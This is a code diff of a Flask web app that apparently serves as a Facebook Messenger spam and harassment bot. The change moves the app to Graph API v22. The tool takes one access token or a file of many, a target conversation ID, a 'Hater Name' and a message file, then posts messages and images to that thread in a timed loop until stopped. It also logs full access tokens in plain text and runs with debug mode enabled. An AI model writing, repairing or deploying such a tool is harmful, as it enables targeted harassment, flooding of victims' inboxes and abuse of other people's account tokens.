@@ -4,8 +4,8 @@ from threading import Thread, Event
 import time
 import random
 import string
-import base64
 import os
+import json
  
 app = Flask(__name__)
 app.debug = True
@@ -29,43 +29,40 @@ headers = {
 stop_events = {}
 threads = {}
  
-def upload_image_to_fb(access_token, image_path, thread_id):
-    """Upload image to Facebook and return attachment ID"""
+def upload_and_send_image(access_token, image_path, thread_id):
+    """Upload and send image using Facebook Graph API v22"""
     try:
-        # First upload the image
-        upload_url = 'https://graph.facebook.com/v15.0/me/message_attachments'
+        # Step 1: Get upload session
+        upload_session_url = f'https://graph.facebook.com/v22.0/{thread_id}/attachment_uploads'
         files = {
-            'filedata': (os.path.basename(image_path), open(image_path, 'rb'), 'image/jpeg')
+            'file': (os.path.basename(image_path), open(image_path, 'rb'), 'image/jpeg')
         }
         data = {
             'access_token': access_token,
-            'message': '{"attachment_type":"image"}'
+            'file_type': 'image'
         }
         
-        response = requests.post(upload_url, files=files, data=data)
-        if response.status_code == 200:
-            attachment_id = response.json().get('attachment_id')
-            return attachment_id
-        else:
-            print(f"Image upload failed: {response.text}")
-            return None
+        session_response = requests.post(upload_session_url, files=files, data=data)
+        
+        if session_response.status_code == 200:
+            upload_data = session_response.json()
+            attachment_upload_id = upload_data.get('id')
+            
+            if attachment_upload_id:
+                # Step 2: Send message with attachment
+                message_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
+                message_data = {
+                    'access_token': access_token,
+                    'message': ' ',
+                    'attachment_upload_id': attachment_upload_id
+                }
+                
+                message_response = requests.post(message_url, data=message_data)
+                return message_response.status_code == 200
+        return False
+        
     except Exception as e:
-        print(f"Error uploading image: {e}")
-        return None
-
-def send_image_attachment(access_token, thread_id, attachment_id):
-    """Send message with image attachment"""
-    try:
-        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-        data = {
-            'access_token': access_token,
-            'message': ' ',
-            'attachment_id': attachment_id
-        }
-        response = requests.post(api_url, data=data)
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Error sending image: {e}")
+        print(f"Error in image upload/send: {e}")
         return False
 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id):
@@ -81,14 +78,17 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_f
                 if stop_event.is_set():
                     break
                     
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                api_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
                 message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
+                parameters = {
+                    'access_token': access_token, 
+                    'message': message
+                }
                 response = requests.post(api_url, data=parameters, headers=headers)
                 if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                    print(f"✓ Message Sent Successfully From token {access_token}: {message}")
                 else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
+                    print(f"✗ Message Failed From token {access_token}: {response.text}")
                 time.sleep(time_interval)
             
             # Send image after each message if image files are provided
@@ -102,17 +102,11 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_f
                     image_path = os.path.join('uploads', image_file)
                     
                     if os.path.exists(image_path):
-                        # Upload image and get attachment ID
-                        attachment_id = upload_image_to_fb(access_token, image_path, thread_id)
-                        if attachment_id:
-                            # Send image using attachment ID
-                            success = send_image_attachment(access_token, thread_id, attachment_id)
-                            if success:
-                                print(f"Image Sent Successfully From token {access_token}: {image_file}")
-                            else:
-                                print(f"Image Sent Failed From token {access_token}: {image_file}")
+                        success = upload_and_send_image(access_token, image_path, thread_id)
+                        if success:
+                            print(f"✓ Image Sent Successfully From token {access_token}: {image_file}")
                         else:
-                            print(f"Image Upload Failed From token {access_token}: {image_file}")
+                            print(f"✗ Image Failed From token {access_token}: {image_file}")
                         
                         time.sleep(time_interval)
  
@@ -160,8 +154,7 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀
-</title>
+  <title>🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
@@ -222,12 +215,19 @@ def send_message():
       border-radius: 5px;
       border: 1px solid white;
     }
+    .success-message {
+      color: green;
+      font-weight: bold;
+    }
+    .error-message {
+      color: red;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mt-3">🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀
-</h1>
+    <h1 class="mt-3">🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</h1>
   </header>
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
@@ -240,7 +240,7 @@ def send_message():
       </div>
       <div class="mb-3" id="singleTokenInput">
         <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
+        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAAB...">
       </div>
       <div class="mb-3" id="tokenFileInput" style="display: none;">
         <label for="tokenFile" class="form-label">Choose Token File</label>
@@ -248,15 +248,15 @@ def send_message():
       </div>
       <div class="mb-3">
         <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
+        <input type="text" class="form-control" id="threadId" name="threadId" required placeholder="t_1000...">
       </div>
       <div class="mb-3">
         <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
+        <input type="text" class="form-control" id="kidx" name="kidx" required placeholder="Your Name">
       </div>
       <div class="mb-3">
         <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
+        <input type="number" class="form-control" id="time" name="time" required min="1" value="2">
       </div>
       <div class="mb-3">
         <label for="txtFile" class="form-label">Choose Your Np File</label>
@@ -269,18 +269,19 @@ def send_message():
         <div id="imagePreview" class="mt-2"></div>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
-      </form>
+    </form>
+    
     <form method="post" action="/stop">
       <div class="mb-3">
         <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
+        <input type="text" class="form-control" id="taskId" name="taskId" required placeholder="Enter task ID">
       </div>
       <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
     </form>
   </div>
   <footer class="footer">
     <p>© 2025 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄</p>
-    <p> 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄<a href="https://www.facebook.com/100064267823693">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <p>𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 <a href="https://www.facebook.com/100064267823693">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
     <div class="mb-3">
       <a href="https://wa.me/+917543864229" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
